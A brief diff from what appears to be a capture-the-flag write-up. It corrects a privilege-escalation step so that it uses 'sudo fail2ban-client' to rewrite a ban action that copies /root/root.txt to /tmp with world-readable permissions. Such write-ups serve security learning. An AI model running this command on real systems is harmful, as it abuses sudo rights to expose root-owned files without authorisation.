@@ -27,7 +27,7 @@
     - Misused `actionban`, but realized correct syntax was `action`
     - Overwrote a rule to execute:
       ```bash
-       sudo /usr/bin/fail2ban set sshd action iptables-multiport actionban "cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt"
+       sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt"
       ````
     - To trigger the fail2ban:
       ```bash
